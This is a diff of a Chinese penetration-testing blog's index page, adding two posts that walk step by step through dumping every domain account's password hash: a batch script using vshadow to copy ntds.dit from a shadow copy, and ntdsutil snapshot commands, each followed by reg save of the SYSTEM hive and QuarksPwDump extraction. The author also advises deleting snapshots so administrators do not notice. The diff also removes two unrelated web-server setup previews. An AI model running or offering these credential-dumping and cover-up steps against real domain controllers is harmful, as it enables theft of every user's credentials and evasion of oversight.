@@ -139,6 +139,85 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/08/14/shadow-copy-hash/">
+                完整导出域内用户hash小记 [vshadow + ShadowCopy + QuarksPwDump]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-14</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/domainhash/">domainhash</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>利用vsshadow <code>[ 微软的卷影拷贝工具 ]</code>,来复制出ntds.dit,从而导出域内所有用户hash,本地虽然没问题,但实际测试中有时候会不好使</p>
+<p>第一步:将三个工具都传到目标机器的同一目录下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vshadow.exe + ShadowCopy.bat + QuarksPwDump.exe</div></pre></td></tr></table></figure></p>
+<p>shadowcopy.cat:<br><figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">setlocal</span></div><div class="line"><span class="keyword">if</span> <span class="keyword">NOT</span> "<span class="variable">%CALLBACK_SCRIPT%</span>"=="" <span class="keyword">goto</span> :IS_CALLBACK</div><div class="line"><span class="built_in">set</span> SOURCE_DRIVE_LETTER=<span class="variable">%SystemDrive%</span></div><div class="line"><span class="built_in">set</span> SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit</div><div class="line"><span class="built_in">set</span> DESTINATION_PATH=%~dp0</div><div class="line">@<span class="built_in">echo</span> ...Determine the scripts to be executed/generated...</div><div class="line"><span class="built_in">set</span> CALLBACK_SCRIPT=%~dpnx0</div><div class="line"><span class="built_in">set</span> TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.<span class="built_in">cmd</span></div><div class="line">@<span class="built_in">echo</span> ...Creating the shadow <span class="built_in">copy</span>...</div><div class="line">"%~dp0vshadow.exe" -script=<span class="variable">%TEMP_GENERATED_SCRIPT%</span> -exec="<span class="variable">%CALLBACK_SCRIPT%</span>" <span class="variable">%SOURCE_DRIVE_LETTER%</span></div><div class="line"><span class="built_in">del</span> /f <span class="variable">%TEMP_GENERATED_SCRIPT%</span></div><div class="line">@<span class="keyword">goto</span> :EOF</div><div class="line">:IS_CALLBACK</div><div class="line"><span class="built_in">setlocal</span></div><div class="line">@<span class="built_in">echo</span> ...Obtaining the shadow <span class="built_in">copy</span> device name...</div><div class="line"><span class="keyword">call</span> <span class="variable">%TEMP_GENERATED_SCRIPT%</span></div><div class="line">@<span class="built_in">echo</span> ...Copying from the shadow <span class="built_in">copy</span> to the destination <span class="built_in">path</span>...</div><div class="line"><span class="built_in">copy</span> "<span class="variable">%SHADOW_DEVICE_1%</span>\<span class="variable">%SOURCE_RELATIVE_PATH%</span>" <span class="variable">%DESTINATION_PATH%</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/shadowcopy exec.png" alt=""><br><br><img src="/img/shadowcopy exec res.png" alt=""><br></p>
+<p>第二步:然后以管理员权限运行ShadowCopy.bat脚本,之后提取的ntds.dit会被复制到当前目录,利用esentutl工具修复ntds.dit文件<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">esentutl /p /o ntds.dit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/shadowcopy esentutl.png" alt=""><br></p>
+<p>第三步:利用QuarksPwDump 读取修复后的ntds.dit文件,导出域内所有账户hash<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg save hklm\system system.hive 同样还是先导出syskey</div><div class="line">QuarksPwDump.exe --dump-hash-domain --with-history --ntds-file <span class="symbol">c:</span>\ntds.dit --system-file <span class="symbol">c:</span>\system.hive -o <span class="symbol">c:</span>\res.txt 一定要注意这里要给绝对路径,选项参数之间只能有一个空格</div></pre></td></tr></table></figure></p>
+<p><img src="/img/shadowcopy hash.png" alt=""><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/08/14/ntdsutil-quarkspwdump/">
+                完整导出域内用户hash小记 [ ntdsutil + QuarksPwDump ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-14</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/domainhash/">domainhash</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>自己在实际渗透中这种方法用的相对比较多[方便快捷],ntdsutil[ad数据库的命令行管理工具],利用它我们可以快速手工创建快照导出域内用户数据库),像这样的操作,实际渗透中还是不要交互的好,所以下面会全部都以非交互的方式来进行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntdsutil + QuarksPwDump</div></pre></td></tr></table></figure></p>
+<p>第一步:创建快照<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntdsutil snapshot <span class="string">"activate instance ntds"</span> create quit quit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil snapshot.png" alt=""></p>
+<p>第二步:挂载刚才生成好的快照:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntdsutil snapshot <span class="string">"mount &#123;793a0923-1a83-428b-8860-535fb2b2866a&#125;"</span> quit quit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil mount.png" alt=""><br><img src="/img/ntdsutil mount res.png" alt=""></p>
+<p>第三步:把导出的ntds数据库复制到指定位置<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">copy <span class="symbol">C:</span>\$SNAP_201705211114_VOLUMEC$\windows\ntds\ntds.dit <span class="symbol">c:</span>\ntds.dit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil copy.png" alt=""></p>
+<p>第四步:删除快照,还是要注意千万别忘了,被管理发现始终不太好<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntdsutil snapshot <span class="string">"unmount &#123;793a0923-1a83-428b-8860-535fb2b2866a&#125;"</span> <span class="string">"delete &#123;793a0923-1a83-428b-8860-535fb2b2866a&#125;"</span> quit quit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil unmount.png" alt=""></p>
+<p>第五步:开始利用QuarksPwDump提取账户hash<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg save hklm\system system.hiv  提取syskey,这里就直接放到当前目录下了,等会儿提取hash要用</div><div class="line">QuarksPwDump.exe --dump-hash-domain --with-history --ntds-file <span class="symbol">c:</span>\ntds.dit --system-file <span class="symbol">c:</span>\system.hiv -o <span class="symbol">c:</span>\pass.txt</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil hash.png" alt=""></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/08/13/vssown-vbs-libesedb-NtdsXtract/">
                 完整导出域内用户hash小记 [vssown.vbs + libesedb + NtdsXtract]
             </a>
@@ -809,73 +888,6 @@
 <p>此次要实现的大致架构如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">php5</span><span class="selector-class">.5</span><span class="selector-class">.38</span> + <span class="selector-tag">mysql-5</span><span class="selector-class">.5</span><span class="selector-class">.32</span> + <span class="selector-tag">nginx-1</span><span class="selector-class">.12</span><span class="selector-class">.1</span> + <span class="selector-tag">centOS6</span><span class="selector-class">.8_x64</span></div></pre></td></tr></table></figure></p>
         </div>
         <a href="/2016/06/23/Midlnmp/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/06/22/Oldlamp/">
-                httpd 2.2.34  + mysql 5.1.68 + centOS 6.8_x64 + php 5.2.17
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-06-22</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/env/">env</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>一、首先,部署apache</p>
-<p>0x01 还是接着我们之前准备好的系统继续,首先,将所有准备安装的源码包上传至服务器,软件包列表如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">httpd-2</span><span class="selector-class">.2</span><span class="selector-class">.34</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">libiconv-1</span><span class="selector-class">.14</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">libmcrypt-2</span><span class="selector-class">.5</span><span class="selector-class">.8</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">mcrypt-2</span><span class="selector-class">.6</span><span class="selector-class">.8</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">mhash-0</span><span class="selector-class">.9</span><span class="selector-class">.9</span><span class="selector-class">.9</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">mysql-5</span><span class="selector-class">.1</span><span class="selector-class">.68</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">php-5</span><span class="selector-class">.2</span><span class="selector-class">.17</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">cronolog-1</span><span class="selector-class">.6</span><span class="selector-class">.2</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div></pre></td></tr></table></figure></p>
-<p>本次要完成的大致架构如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">httpd</span> 2<span class="selector-class">.2</span><span class="selector-class">.34</span>  + <span class="selector-tag">mysql</span> 5<span class="selector-class">.1</span><span class="selector-class">.68</span> + <span class="selector-tag">centOS</span> 6<span class="selector-class">.8_x64</span> + <span class="selector-tag">php</span> 5<span class="selector-class">.2</span><span class="selector-class">.17</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/06/22/Oldlamp/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/06/21/Oldlnmp/">
-                php5.3.27 + mysql-5.5.32 + nginx-1.10.3 + centOS6.8_x64
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-06-21</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/env/">env</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<p>一、首先,部署nginx</p>
-<p>0x01 依旧接着我们之前准备好的系统继续,首先,将所有准备安装的源码包上传至服务器,软件包列表如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">libiconv-1</span><span class="selector-class">.14</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">libmcrypt-2</span><span class="selector-class">.5</span><span class="selector-class">.8</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">mysql-5</span><span class="selector-class">.5</span><span class="selector-class">.32-linux2</span><span class="selector-class">.6-x86_64</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">nginx-1</span><span class="selector-class">.10</span><span class="selector-class">.3</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">php-5</span><span class="selector-class">.3</span><span class="selector-class">.27</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div></pre></td></tr></table></figure></p>
-<p>此次要实现的大致架构如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">php5</span><span class="selector-class">.3</span><span class="selector-class">.27</span> + <span class="selector-tag">mysql-5</span><span class="selector-class">.5</span><span class="selector-class">.32</span> + <span class="selector-tag">nginx-1</span><span class="selector-class">.10</span><span class="selector-class">.3</span> + <span class="selector-tag">centOS6</span><span class="selector-class">.8_x64</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/06/21/Oldlnmp/" class="read-more">Read More</a>
     
 
 </div>
